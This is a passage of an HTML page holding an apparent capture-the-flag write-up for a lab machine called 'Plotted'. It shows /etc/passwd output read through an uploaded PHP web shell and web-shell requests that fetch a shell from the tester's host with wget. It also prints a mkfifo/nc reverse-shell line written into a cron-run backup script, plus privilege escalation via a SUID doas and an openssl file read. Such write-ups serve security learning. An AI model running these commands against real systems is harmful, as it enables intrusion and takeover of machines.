+<span class="n">gnats</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">41</span><span class="o">:</span><span class="m">41</span><span class="o">:</span><span class="n">Gnats</span><span class="w"> </span><span class="n">Bug</span><span class="o">-</span><span class="n">Reporting</span><span class="w"> </span><span class="nf">System </span><span class="p">(</span><span class="n">admin</span><span class="p">)</span><span class="o">:/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">gnats</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">nobody</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">65534</span><span class="o">:</span><span class="m">65534</span><span class="o">:</span><span class="n">nobody</span><span class="o">:/</span><span class="n">nonexistent</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">network</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">100</span><span class="o">:</span><span class="m">102</span><span class="o">:</span><span class="n">systemd</span><span class="w"> </span><span class="n">Network</span><span class="w"> </span><span class="n">Management</span><span class="p">,,,</span><span class="o">:/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">resolve</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">101</span><span class="o">:</span><span class="m">103</span><span class="o">:</span><span class="n">systemd</span><span class="w"> </span><span class="n">Resolver</span><span class="p">,,,</span><span class="o">:/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">timesync</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">102</span><span class="o">:</span><span class="m">104</span><span class="o">:</span><span class="n">systemd</span><span class="w"> </span><span class="n">Time</span><span class="w"> </span><span class="n">Synchronization</span><span class="p">,,,</span><span class="o">:/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">messagebus</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">103</span><span class="o">:</span><span class="m">106</span><span class="o">::/</span><span class="n">nonexistent</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">syslog</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">104</span><span class="o">:</span><span class="m">110</span><span class="o">::/</span><span class="n">home</span><span class="o">/</span><span class="n">syslog</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+_<span class="n">apt</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">105</span><span class="o">:</span><span class="m">65534</span><span class="o">::/</span><span class="n">nonexistent</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">tss</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">106</span><span class="o">:</span><span class="m">111</span><span class="o">:</span><span class="n">TPM</span><span class="w"> </span><span class="n">software</span><span class="w"> </span><span class="n">stack</span><span class="p">,,,</span><span class="o">:/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">tpm</span><span class="o">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">false</span>
+<span class="n">uuidd</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">107</span><span class="o">:</span><span class="m">112</span><span class="o">::/</span><span class="n">run</span><span class="o">/</span><span class="n">uuidd</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">tcpdump</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">108</span><span class="o">:</span><span class="m">113</span><span class="o">::/</span><span class="n">nonexistent</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">landscape</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">109</span><span class="o">:</span><span class="m">115</span><span class="o">::/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">landscape</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">pollinate</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">110</span><span class="o">:</span><span class="m">1</span><span class="o">::/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">pollinate</span><span class="o">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">false</span>
+<span class="n">usbmux</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">111</span><span class="o">:</span><span class="m">46</span><span class="o">:</span><span class="n">usbmux</span><span class="w"> </span><span class="n">daemon</span><span class="p">,,,</span><span class="o">:/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">usbmux</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">sshd</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">112</span><span class="o">:</span><span class="m">65534</span><span class="o">::/</span><span class="n">run</span><span class="o">/</span><span class="n">sshd</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">coredump</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">999</span><span class="o">:</span><span class="m">999</span><span class="o">:</span><span class="n">systemd</span><span class="w"> </span><span class="n">Core</span><span class="w"> </span><span class="n">Dumper</span><span class="o">:/:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="hll"><span class="n">ubuntu</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">1000</span><span class="o">:</span><span class="m">1000</span><span class="o">:</span><span class="n">ubuntu</span><span class="o">:/</span><span class="n">home</span><span class="o">/</span><span class="n">ubuntu</span><span class="o">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+</span><span class="n">lxd</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">998</span><span class="o">:</span><span class="m">100</span><span class="o">::/</span><span class="n">var</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">lxd</span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">lxd</span><span class="o">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">false</span>
+<span class="n">mysql</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">113</span><span class="o">:</span><span class="m">118</span><span class="o">:</span><span class="n">MySQL</span><span class="w"> </span><span class="n">Server</span><span class="p">,,,</span><span class="o">:/</span><span class="n">nonexistent</span><span class="o">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">false</span>
+<span class="hll"><span class="n">plot_admin</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">1001</span><span class="o">:</span><span class="m">1001</span><span class="o">:</span><span class="p">,,,</span><span class="o">:/</span><span class="n">home</span><span class="o">/</span><span class="n">plot_admin</span><span class="o">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+</span></code></pre></div></td></tr></table></div>
+<p>The command revealed the names of the users <strong>plot_admin</strong> and <strong>ubuntu</strong>.</p>
+<p>To further penetrate the system, I set out to get a stabilized reverse shell. I hosted a reverse shell from my side and accessed it through the cmd argument. </p>
+<div class="admonition bug">
+<p class="admonition-title">RCE</p>
+<p><div class="highlight"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/management/uploads/1677425460_evil.php?cmd=wget+http%3a//10.17.3.217%3a8000/shell.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/management/uploads/1677425460_evil.php?cmd=chmod+777+shell.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</code></pre></div></p>
+</div>
+<p>Upon accessing <a>http://10.10.72.232:445/management/uploads/shell.php</a>, </p>
+<p>I successfully gained a reverse shell for the <strong><code>www-data</code></strong> user.</p>
+<h2 id="privilege-escalation"><b>Privilege Escalation</b><a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<h3 id="gaining-user-access-plot_admin"><b>Gaining User access (plot_admin)</b><a class="headerlink" href="#gaining-user-access-plot_admin" title="Permanent link">&para;</a></h3>
+<p>Next, I sent a linpeas script to the system and executed it and these were the following results:</p>
+<ul>
+<li>Sudo version 1.8.31</li>
+<li>CVE-2022-2588</li>
+<li>* *     * * *   plot_admin /var/www/scripts/backup.sh</li>
+<li>127.0.0.1:3306</li>
+<li>127.0.0.1:33060</li>
+<li>/swap.img</li>
+</ul>
+<p>It revealed that there was a script running in a cron job every minute. I believed this to be the door for privilege escalation.</p>
+<div class="admonition warning">
+<p class="admonition-title">Something Seemed off</p>
+<p><span>The <strong><code>backup.sh</code></strong> file was owned by <strong>plot_admin</strong>, while <strong><code>/var/www/scripts/</code></strong> was owned by <strong>www-data</strong> (the current user). </span></p>
+</div>
+<p>This was a  security risk as anyone could delete the content from the folder and recreate it. So, I took this advantage to give permissions to <strong>user.txt</strong> and <strong>tms_backups</strong> in the <strong><code>/home/plot_admin</code></strong> folder and accessed the first flag.</p>
+<p><img id="image5" /></p>
+<h3 id="gaining-root-access"><b>Gaining Root access</b><a class="headerlink" href="#gaining-root-access" title="Permanent link">&para;</a></h3>
+<p>From there, I escalated my privilege to plot_admin by overwriting the backup.sh with a reverse shell. </p>
+<div class="highlight"><pre><span></span><code><span class="n">rm</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="p">;</span><span class="w"> </span><span class="n">mkfifo</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="p">;</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="m">2</span><span class="o">&gt;&amp;</span><span class="m">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="m">10.17</span><span class="n">.</span><span class="m">3.217</span><span class="w"> </span><span class="m">5432</span><span class="w"> </span><span class="o">&gt;/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="w">  </span>
+</code></pre></div>
+<p>Running <strong>linpeas.sh</strong> again, I found the following:</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">   </span><span class="m">1</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">               </span><span class="m">68208</span><span class="w"> </span><span class="n">Jul</span><span class="w"> </span><span class="m">14</span><span class="w">  </span><span class="m">2021</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">passwd</span>
+<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">   </span><span class="m">1</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">              </span><span class="m">166056</span><span class="w"> </span><span class="n">Jan</span><span class="w"> </span><span class="m">19</span><span class="w">  </span><span class="m">2021</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sudo</span>
+<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">   </span><span class="m">1</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">               </span><span class="m">88464</span><span class="w"> </span><span class="n">Jul</span><span class="w"> </span><span class="m">14</span><span class="w">  </span><span class="m">2021</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">gpasswd</span>
+<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">   </span><span class="m">1</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">               </span><span class="m">55528</span><span class="w"> </span><span class="n">Jul</span><span class="w"> </span><span class="m">21</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">mount</span>
+<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">   </span><span class="m">1</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">               </span><span class="m">67816</span><span class="w"> </span><span class="n">Jul</span><span class="w"> </span><span class="m">21</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">su</span>
+<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">   </span><span class="m">1</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">               </span><span class="m">85064</span><span class="w"> </span><span class="n">Jul</span><span class="w"> </span><span class="m">14</span><span class="w">  </span><span class="m">2021</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">chfn</span>
+<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">   </span><span class="m">1</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">               </span><span class="m">39144</span><span class="w"> </span><span class="n">Mar</span><span class="w">  </span><span class="m">7</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">fusermount</span>
+<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">   </span><span class="m">1</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">               </span><span class="m">53040</span><span class="w"> </span><span class="n">Jul</span><span class="w"> </span><span class="m">14</span><span class="w">  </span><span class="m">2021</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">chsh</span>
+<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">   </span><span class="m">1</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">               </span><span class="m">39144</span><span class="w"> </span><span class="n">Jul</span><span class="w"> </span><span class="m">21</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">umount</span>
+<span class="hll"><span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">   </span><span class="m">1</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">               </span><span class="m">39008</span><span class="w"> </span><span class="n">Feb</span><span class="w">  </span><span class="m">5</span><span class="w">  </span><span class="m">2021</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">doas</span>
+</span><span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">   </span><span class="m">1</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">               </span><span class="m">44784</span><span class="w"> </span><span class="n">Jul</span><span class="w"> </span><span class="m">14</span><span class="w">  </span><span class="m">2021</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">newgrp</span>
+<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">   </span><span class="m">1</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">               </span><span class="m">19040</span><span class="w"> </span><span class="n">Jun</span><span class="w">  </span><span class="m">3</span><span class="w">  </span><span class="m">2021</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">libexec</span><span class="o">/</span><span class="n">polkit</span><span class="o">-</span><span class="n">agent</span><span class="o">-</span><span class="n">helper</span><span class="m">-1</span>
+<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">   </span><span class="m">1</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">              </span><span class="m">130408</span><span class="w"> </span><span class="n">Mar</span><span class="w"> </span><span class="m">26</span><span class="w">  </span><span class="m">2021</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">snapd</span><span class="o">/</span><span class="n">snap</span><span class="o">-</span><span class="n">confine</span>
+<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">   </span><span class="m">1</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">               </span><span class="m">14488</span><span class="w"> </span><span class="n">Jul</span><span class="w">  </span><span class="m">8</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">eject</span><span class="o">/</span><span class="n">dmcrypt</span><span class="o">-</span><span class="n">get</span><span class="o">-</span><span class="n">device</span>
+<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">   </span><span class="m">1</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">              </span><span class="m">473576</span><span class="w"> </span><span class="n">Jul</span><span class="w"> </span><span class="m">23</span><span class="w">  </span><span class="m">2021</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">openssh</span><span class="o">/</span><span class="n">ssh</span><span class="o">-</span><span class="n">keysign</span>
+</code></pre></div></td></tr></table></div>
+<p><img id="image6" /></p>
+<div class="admonition abstract">
+<p class="admonition-title">Definition</p>
+<p><span>The doas command (short for "do as") is a linux utility that allows a user to execute a command with the privileges of another user, typically the root user.</span></p>
+</div>
+<p>Leveraging the openssl command alongside the doas command in <a href="https://gtfobins.github.io/gtfobins/openssl/#file-read">gtfobins</a>, I was able to read files and ultimately obtain the second flag.</p>
+<p><img id="image7" /></p>
+<script>
+
+// JSON object
+const data = {
+    "desc": "Everything here is plotted! Tip: Enumeration is key!",
+    "ip":  "10.10.72.232",
+    "ports": "22/tcp,ssh,OpenSSH 8.2p1 Ubuntu 4ubuntu0.3;80/tcp,http,Apache httpd 2.4.41;445/tcp,http,Apache httpd 2.4.41",
+    "difficulty":"easy",
+    "id": "7"
+}
+
+
+function updateHTML() {
+
+    const keys = Object.keys(data);
+    const values = Object.values(data);
+
+    for(var z=0; z < keys.length; z++){
+
+        if(keys[z] === "ports"){
+            const ports = data.ports.split(';');
+            for(var i = 0; i < ports.length; i++){
+                document.getElementById("p"+(i+1)).innerHTML = ports[i].split(',')[0].toUpperCase();
+                document.getElementById("s"+(i+1)).innerHTML = ports[i].split(',')[1].toUpperCase();
+                document.getElementById("d"+(i+1)).innerHTML = ports[i].split(',')[2];
+            }
+        }
+        else{
+            try{
+            document.getElementById(keys[z]).innerHTML = values[z];
+            }
+            catch(error){
+                console.log(values[z]);
+            }
+        }
+    }
+
+    // replace the values with your specific filenames and number of images and img tags
+    const numImgTags = document.getElementsByTagName('img').length;
+
+    for (let i = 1; i <= numImgTags; i++) {
+    const imgTag = document.getElementById('image' + i);
+        if (imgTag) {
+            imgTag.src = '../images/'+data.difficulty[0]+data.id+'-image' + i + '.png';
+        }
+    }
+
+
+}
+
+updateHTML();
+</script>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var tab,labels=set.querySelector(".tabbed-labels");for(tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../AllInOne/" class="md-footer__link md-footer__link--prev" aria-label="Previous: All in One" rel="prev">
+            <div class="md-footer__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <div class="md-ellipsis">
+                <span class="md-footer__direction">
+                  Previous
+                </span>
+                All in One
+              </div>
+            </div>
+          </a>
+        
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://twitter.com/vasanth__vanan" target="_blank" rel="noopener" title="Vasanth Vanan on Twitter" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://github.com/VasanthVanan" target="_blank" rel="noopener" title="Vasanth Vanan on Github" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://www.linkedin.com/in/vasanthavanan/" target="_blank" rel="noopener" title="Vasanth Vanan on Linkedin" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://www.instagram.com/vasanth_vanan/" target="_blank" rel="noopener" title="Vasanth Vanan on Instagram" class="md-social__link">
